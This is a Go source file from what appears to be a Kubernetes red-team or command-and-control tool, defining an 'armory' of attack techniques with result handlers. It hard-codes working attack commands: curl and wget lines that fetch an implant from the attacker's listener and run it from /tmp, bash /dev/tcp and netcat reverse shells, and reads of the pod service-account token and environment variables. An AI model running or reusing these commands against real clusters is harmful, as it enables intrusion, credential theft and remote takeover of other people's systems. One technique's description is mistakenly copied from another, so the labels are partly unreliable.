package armory

import (
	"encoding/json"
	"errors"
	"fmt"
	"io/fs"
	"log/slog"
	"os"
	"path/filepath"
	"strings"

	k8s_types "github.com/Magier/Ran/k8sclient/types"

	"github.com/Magier/Ran/domain"
	"gopkg.in/yaml.v2"
)

// type ResultHandler = func(source domain.Entity, args ...any) (domain.Event, error)

// type TTPMeta struct {
// 	Title, Description string
// 	ResultHandler      ResultHandler
// }

// func (meta TTPMeta) GetTitle() string {
// 	return meta.Title
// }
// func (meta TTPMeta) GetDescription() string {
// 	return meta.Description
// }

// func (meta TTPMeta) HandleResult(source domain.Entity, args ...any) (domain.Event, error) {
// 	if meta.ResultHandler == nil {
// 		return nil, nil
// 	}
// 	return meta.ResultHandler(source, args...)
// }

// type CreateListener struct {
// 	TTPMeta
// 	Port uint
// }

// func (c CreateListener) GetMessage() domain.Message {
// 	return domain.StartListener{Port: c.Port}
// }

// type CreateRedirector struct {
// 	TTPMeta
// 	DstPort uint
// }

// func (c CreateRedirector) GetMessage() domain.Message {
// 	return
// }

// type ReadEnvVars struct {
// 	TTPMeta
// 	TargetId        string
// 	Target          string
// 	TargetNamespace string
// }

// func (c ReadEnvVars) GetMessage() domain.Message {
// 	return domain.ReadEnvVars{
// 		Target: &domain.Target{
// 			Id:   c.TargetId,
// 			Name: c.Target,
// 			Ns:   c.TargetNamespace,
// 		},
// 	}
// }

// func (c KubectlExecCmd) GetMessage() domain.Message {
// 	return &domain.ExecTTP{TTP: c, Cmd: c.Cmd, Target: &domain.Target{}, C2Channel: KubectlExecCmd{}}
// }

type Armory struct {
	ttps []domain.TTP
}

func LoadArmory(dir string) (Armory, error) {
	ttps := []domain.TTP{
		{
			Name:        "Create Listener",
			Description: "Catch incoming shells",
			Tactics:     []domain.Tactic{domain.ResourceDevelopment},
			Command:     domain.StartListener{Port: 1337, Protocol: domain.HTTP},
			// Port:        1337,
			CmdVariants: []domain.CmdVariant{},
			// Effects: c2.ListenerReady{},
		},
		{
			Name:        "Create Redirector",
			Description: "Create a proxy routing traffic to the C2",
			Tactics:     []domain.Tactic{domain.ResourceDevelopment},
			Command:     domain.StartC2Redirector{DstPort: 1337},
			Requires:    domain.Requirements{Exists: "listener"},
		},
		{
			Name:        "Drop & Exec Implant",
			Description: "Command to download a prepared C2 implant and execute it to establish a session",
			Tactics:     []domain.Tactic{domain.Execution},
			// Cmd:         "sh -c 'wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause'",
			// Cmd: "sh -c \"wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &\"",
			CmdVariants: []domain.CmdVariant{
				{Key: "curl", Command: `sh -c "curl -L $LISTENER:$FILESHARE_PORT/implant -o /tmp/pause && chmod +x /tmp/pause && /tmp/pause &"`},
				{Key: "wget", Command: "wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &"},
			},
			Requires: domain.Requirements{AccessLevel: domain.UserExec},
		},
		{
			Name:        "Read SerivceAccount Token",
			Description: "Command to download a prepared C2 implant and execute it to establish a session",
			Tactics:     []domain.Tactic{domain.CredentialAccess},
			CmdVariants: []domain.CmdVariant{
				{Key: "", Command: "cat"},
				{Key: "sliver", Command: "get_file"},
			},
			Args:          map[string]string{"": "/var/run/secrets/kubernetes.io/serviceaccount/token"},
			Requires:      domain.Requirements{AccessLevel: domain.UserRead},
			Effects:       []string{"Pod name", "ServiceAccount name", "Namespace name"},
			ResultHandler: handleSaTokenRead,
		},
		{
			Name:     "Install kubectl",
			Tactics:  []domain.Tactic{domain.Discovery},
			Requires: domain.Requirements{Kind: "Pod", AccessLevel: domain.UserExec},
			CmdVariants: []domain.CmdVariant{
				{Key: "curl", Command: `curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" && chmod +x kubectl && mkdir -p ~/.local/bin && mv ./kubectl ~/.local/bin/kubectl`},
			},
		},

		{
			Name:     "Check Token permissions",
			Tactics:  []domain.Tactic{domain.Discovery},
			Requires: domain.Requirements{Kind: "ServiceAccount"},
			CmdVariants: []domain.CmdVariant{
				// "kubectl":           "kubectl auth can-i --list --token=${TOKEN} --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n ${NS}",
				// "kubectl_remote_sa": "kubectl auth can-i --list --token=${TOKEN} --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n ${NS} --as=system:serviceaccount:${NS}:${SA.NAME}",
				// -H "application/vnd.kubernetes.protobuf,application/json"
				//	-H "Impersonate-User: system:serviceaccount:${NS}:${SA_NAME}"   <- for "external" checks; requires impersonation RBAC permissions
				{Key: "curl", Command: `curl -XPOST
					${API_SERVER}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews
					--cacert ${CA_PATH}
					-H "Authorization: Bearer ${TOKEN}"
					-H "Content-Type: application/json"
					--data '{
						"kind": "SelfSubjectRulesReview",
						"apiVersion": "authorization.k8s.io/v1",
						"spec": { "namespace": "${NS}" }
					}'`},
			},
			ResultHandler: handleSelfSubjectReviewResult,
		},
		{
			Name:        "Start reverse shell",
			Description: "Establish a simple shell",
			Tactics:     []domain.Tactic{domain.Execution},
			CmdVariants: []domain.CmdVariant{
				{Key: "bash", Command: "sh -i >& /dev/tcp/$LISTENER/$LISTENER_PORT 0>&1 &"},
				{Key: "nc", Command: "nc $LISTENER $LISTENER_PORT -e /bin/sh &"},
			},
			Requires: domain.Requirements{Infra: []string{"Listener"}, AccessLevel: domain.UserExec},
		},
		{
			Name:          "Read Environment Variables",
			Description:   "Read environment variables from a target",
			Tactics:       []domain.Tactic{domain.Discovery},
			Requires:      domain.Requirements{AccessLevel: domain.UserRead},
			Cmd:           "env",
			ResultHandler: handleEnvVarResult,
		},
	}

	err := filepath.WalkDir(dir, func(w string, d fs.DirEntry, err error) error {
		if d.IsDir() {
			// skip subfolder with all unsupported check details
			// if d.Name() == SkipDir { }
			return err
		}

		if strings.HasSuffix(w, ".yaml") {
			content, err := os.ReadFile(w)
			if err != nil {
				return fmt.Errorf("failed to read file %s: %w", w, err)
			}

			var ttp domain.TTP
			err = yaml.Unmarshal(content, &ttp)
			if err != nil {
				return fmt.Errorf("failed to unmarshal YAML content from file %s: %w", w, err)
			}

			ttps = append(ttps, ttp)
			// parse the TTP
			// parse the preconditions and effect

		}

		if strings.HasSuffix(w, ".md") {
			// parse the TTP
			// parse the preconditions and effect
			// invoke builder to get the currect sub-type of the TTP (based on the kind?)

		}

		return nil
	})
	if err != nil {
		fmt.Println("Couldn't load armory: ", err.Error())
	}

	return Armory{
		ttps: ttps,
	}, nil
}

func (a Armory) GetTTP(id string) (domain.TTP, bool) {
	for _, ttp := range a.ttps {
		if ttp.GetID() == id {
			return ttp, true
		}
	}
	return domain.TTP{}, false
}

func (a Armory) GetTTPs() []domain.TTP {
	return a.ttps
}

func handleEnvVarResult(source domain.Entity, args ...any) (domain.Event, error) {
	stderr := args[1].(string)
	if stderr != "" {
		return nil, errors.New(stderr)
	}

	stdout := args[0].(string)
	vars := make(map[string]string)
	for _, l := range strings.Split(stdout, "\n") {
		k, v, ok := strings.Cut(l, "=")
		if ok {
			vars[k] = v
		}
	}

	return domain.EnvVarsExtracted{
		Source: source,
		Vars:   vars,
	}, nil
}

func handleSaTokenRead(source domain.Entity, args ...any) (domain.Event, error) {
	if len(args) == 0 {
		return nil, fmt.Errorf("No SA token provided as argument")
	}

	var token string
	switch t := args[0].(type) {
	case string:
		token = t
	case []byte:
		token = string(t)
	}
	if len(token) == 0 {
		return nil, fmt.Errorf("Empty SA token can't be decoded")
	}
	if len(args) > 1 {
		if args[1] != "" {
			return nil, fmt.Errorf("Sa Token Read expects exactly 1 argument - received %d", len(args))
		}
	}
	return domain.ServiceAccountTokenExtracted{
		SourceSystemId: source.GetId(),
		Token:          token,
	}, nil
}

func handleSelfSubjectReviewResult(source domain.Entity, args ...any) (domain.Event, error) {
	// try parse JSON
	if len(args) == 0 {
		return nil, fmt.Errorf("No data")
	}
	jsonData, ok := args[0].(string)
	if !ok {
		return nil, fmt.Errorf("Expected string data")
	}

	var result k8s_types.SelfSubjectRulesReview
	err := json.Unmarshal([]byte(jsonData), &result)
	if err != nil {
		return nil, fmt.Errorf("Failed to unmarshal JSON: %w", err)
	}

	if result.Code >= 400 {
		return domain.TTPFailed{
			Reason: result.Message,
		}, nil
	}

	if result.Status.Incomplete {
		slog.Warn("Results from SelfSubjectRulesReview are incomplete!")
	}

	sa, ok := source.(domain.ServiceAccount)
	if !ok {
		slog.Warn("the source of the SubjectReviewResult is not a valid ServiceAccount!")
	}
	return domain.TokenPermissionsRetrieved{
		TokenName:        source.GetName(),
		ServiceAccount:   sa,
		ResourceRules:    result.Status.ResourceRules,
		NonResourceRules: result.Status.NonResourceRules,
	}, nil
}
